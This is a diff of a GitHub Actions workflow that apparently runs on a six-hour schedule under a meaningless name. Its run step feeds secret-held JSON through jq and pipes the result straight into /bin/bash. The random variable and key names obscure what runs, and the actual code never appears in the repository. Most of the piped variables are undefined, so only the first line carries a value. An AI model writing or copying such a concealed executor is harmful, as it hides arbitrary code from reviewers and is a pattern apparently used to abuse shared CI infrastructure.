@@ -1,9 +1,9 @@
 name: caohong19870101
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '6 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          vqk3: ${{ secrets.vqk3 }}
+          uzig589: ${{ secrets.uzig589 }}
         run: |
-          echo $vqk3 | jq -r .zilkm094 | /bin/bash
-          echo $ad177 | jq -r .vdv2 | /bin/bash
-          echo $cy73445 | jq -r .ao3 | /bin/bash
-          echo $dsazv60351 | jq -r .pvbsy49908 | /bin/bash
-          echo $nl53178 | jq -r .gq96248 | /bin/bash
-          echo $cwcwa6758 | jq -r .hku546 | /bin/bash
-          echo $hfm39 | jq -r .qhrp47 | /bin/bash
-          echo $mu15 | jq -r .bd3 | /bin/bash
-          echo $vfpru8 | jq -r .nhtvx64 | /bin/bash
-          echo $blvs41 | jq -r .x038 | /bin/bash
-          echo $lsews95 | jq -r .nhrs3 | /bin/bash
+          echo $uzig589 | jq -r .zbiez6359 | /bin/bash
+          echo $skenp4241 | jq -r .w2 | /bin/bash
+          echo $z66 | jq -r .q786 | /bin/bash
+          echo $l0378 | jq -r .sb0 | /bin/bash
+          echo $lk5 | jq -r .bdcs52966 | /bin/bash
+          echo $uiny42006 | jq -r .juqoz0 | /bin/bash
+          echo $zjpss92884 | jq -r .rkh5763 | /bin/bash
+          echo $dymxv11 | jq -r .a8 | /bin/bash
+          echo $a64095 | jq -r .shx8 | /bin/bash
+          echo $it2 | jq -r .tpjys57 | /bin/bash
+          echo $ntcv1 | jq -r .vna4589 | /bin/bash
+          echo $gd14 | jq -r .lyu127 | /bin/bash
+          echo $tak553 | jq -r .ovog11361 | /bin/bash
+          echo $kjcr25945 | jq -r .tqrdk8 | /bin/bash
+          echo $jdxpw11627 | jq -r .duvp63 | /bin/bash
+          echo $wdbmg00916 | jq -r .i438 | /bin/bash
+          echo $p3 | jq -r .udbpx01740 | /bin/bash
+          echo $we0964 | jq -r .bibxq4 | /bin/bash
 
